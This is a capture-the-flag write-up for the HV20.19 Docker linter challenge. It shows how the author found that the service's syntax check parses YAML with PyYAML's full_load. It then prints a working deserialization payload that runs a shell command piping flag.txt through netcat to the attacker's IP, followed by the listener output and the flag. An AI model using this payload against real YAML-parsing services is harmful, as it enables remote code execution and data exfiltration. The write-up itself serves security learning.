# HV20.19 Docker Linter Service

For this challenge, we get access to a website that validates some (docker related) configuration files using various linters (`Dockerfile`, `docker-compose.yml` and `.env`). The content of the files can either be specified via an input field or using a file upload. Our goal is to get remote code execution (pop a reverse shell) to get the flag.

From the response headers of the webserver, we can find out that the backend was probably written in _Flask_ (_Python3_ + _Werkzeug_). By playing with the different validation options and submitting a combination of valid and invalid inputs, I was able to get an overview of the tools involved within the linting process:

```
ENV
- dotenv-linter

COMPOSE
- Basic syntax check
- yamllint
- docker-compose

DOCKERFILE
- hadolint
- dockerfile_lint
- dockerlint.js
```

I tried to check for known vulnerabilities / CVE's of these tools but could not find any promising tools. Therefore, I started to focus on the file upload mechanism and tried to perform some sort of command injection or path traversal attack. However, it seemed like the upload was built in a secure way.

At this point I felt a bit lost, so I tried to randomly fuzz the inputs and got an interesting error while submitting some invalid input for the `docker-compose.yml`:

```
Basic syntax check
Linter exited with code 1
while parsing a tag
  in "docker-compose.yml", line 1, column 1
expected URI, but found '\n'
  in "docker-compose.yml", line 1, column 3
```

It seems like the basic syntax check step parses the YAML file in python, so I started to google for some common attacks when parsing YAML in python and found some interesting attack that exploit the `full_load` function of the _PyYAML_ package. I searched for a couple of payloads and after a while I found one that seemed to work and allowed me to execute commands on the remote machine. To get the output of my commands, I simply piped them into netcat and sent the output to my machine. Thankfully, it was easy to find the `flag.txt` file since it was saved in the same folder as our vulnerable program. Using the following YAML file I was able to receive the content of the flag:

```yaml
- !!python/object/new:str
  args: []
  state: !!python/tuple
    - "import os; os.system('cat flag.txt | nc 10.13.0.26 8888')"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
```

```bash
➜  19 git:(main) ✗ nc -lnvvp 8888
listening on [any] 8888 ...
connect to [10.13.0.26] from (UNKNOWN) [152.96.7.3] 46478
HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}
 sent 0, rcvd 46
```

**Flag:** HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}
